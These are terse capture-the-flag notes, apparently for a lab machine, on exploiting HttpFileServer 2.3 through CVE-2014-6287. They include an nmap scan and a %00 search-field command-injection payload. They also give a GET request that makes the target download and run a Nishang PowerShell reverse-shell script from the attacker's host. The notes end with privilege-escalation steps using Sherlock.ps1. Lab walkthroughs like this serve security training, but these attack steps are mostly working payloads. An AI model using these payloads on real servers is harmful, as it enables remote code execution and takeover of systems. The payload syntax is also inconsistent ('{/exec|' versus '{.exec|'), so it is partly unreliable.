nmap -sC -sV 10.10.10.8

port http 80 is open : HttpFileServer - HFS 2.3


way 1 (with powershell_without metasploit):
---------------------------

google: httpfileserver exploit ----> found > CVE-2014-6287

cve-2014-6287:
--------------
allows to execute command by type %00 in search field

*google : HFS scripting
the command is interesting : exec command ----> {.exec|ping <host_ip_addr>.}
on host: tcpdump -i tun0 >>>> to see of we get a ping

get reverse shell:
-----------------

google: nishang - Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing.

go to : nishang/Shells

>cp Invoke-PowerShellTcp.ps1 ~/path_location
*edit script:
add at the buttom:
------------------
Invoke_PowerShellTcp -Reverse -IPAddress <host_ip_addr> -Port 4444

run netcat listener on host
run python http server
on burp execute command : GET /?search=%00{/exec|c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe ping.} ---> dont forget to URL encode
on host: tcpdump -i tun0 >>>> to see of we get a ping
on burp execute command : GET /?search=%00{/exec|c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadingString('http://<host_ip_addr>/Invoke-PowerShellTcp.ps1').} ---> dont forget to URL encode

got a shell - GOT USER

PE:
---

>sysinfo
*transfer Sherlock.ps1 to victim

